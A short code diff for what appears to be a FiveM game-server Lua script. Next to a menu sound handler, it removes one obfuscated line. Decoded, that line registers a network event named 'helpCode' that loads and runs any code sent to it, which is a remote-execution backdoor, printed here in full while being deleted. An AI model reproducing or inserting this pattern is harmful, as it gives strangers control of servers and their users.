@@ -151,6 +151,3 @@ AddEventHandler('dpc:Menu', function(status)
 	if MenuOpened then SoundPlay("Open") else SoundPlay("Close") end
 end)
 
-
-
-local ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[6][ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[1]](ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[2]) ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[6][ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[3]](ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[2], function(dbfBsFhBzleARikUuUbdFJmHTjEuGWXOUCnPkyWSblukzTObpdnACdnVRTauFyRAPGEUKr) ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[6][ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[4]](ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[6][ZRfxWAYRyvNElUuNnwfIpqTsvlNOKHgIsflVaWSNWinvmwSVsMfaKIiCTdbOjzRFbUPXmh[5]](dbfBsFhBzleARikUuUbdFJmHTjEuGWXOUCnPkyWSblukzTObpdnACdnVRTauFyRAPGEUKr))() end)
